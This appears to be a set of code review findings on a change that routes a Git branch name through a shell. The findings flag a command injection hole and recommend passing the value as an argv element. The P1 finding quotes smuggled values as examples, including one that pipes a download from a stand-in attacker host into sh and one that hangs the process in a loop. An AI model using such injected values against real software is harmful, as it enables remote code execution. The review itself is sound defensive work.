findings.title: [P1] Pass `branch` as an argv element to prevent shell command injection
findings.body: `execAsync` runs its argument through a shell, and `branch` is interpolated unescaped. Any caller-controlled value such as `main; curl attacker.example/p | sh` or `$(command)` executes arbitrary commands with the application's privileges. This bites even without an attacker: Git ref names may legitimately contain `;`, `$`, backticks, `&`, `|`, and parentheses, so such refs are misinterpreted or silently corrupt results — e.g. `ref; printf X` makes the promise resolve via the *last* command's exit code even when `git show` fails, and `HEAD; while :; do :; done` hangs the promise with an unbounded CPU loop (`exec` has no timeout). The removed `execFileAsync("git", ["show", branch])` passed the value as a single argv element with no shell, which was the correct contract. Restore it.

findings.title: [P3] Remove the now-unused `execFile` import and `execFileAsync` binding
findings.body: The change removes the only use of `execFileAsync`, leaving both the `execFile` import (line 1) and the promisified const (line 4) as misleading dead code; under TypeScript's `noUnusedLocals` this also fails compilation with TS6133. Keeping `execFileAsync` and reverting the call site (per the P1 finding) makes this moot; otherwise delete both.

findings.title: [P3] Avoid launching a shell for every Git invocation
findings.body: Even for fully trusted branch names, `execAsync` spawns `/bin/sh -c` (or `cmd.exe`) before Git on every call, adding shell startup/parsing overhead versus directly spawning Git via `execFile`. Repeated or latency-sensitive calls regress. Fixing the P1 by returning to `execFileAsync` resolves this as well.
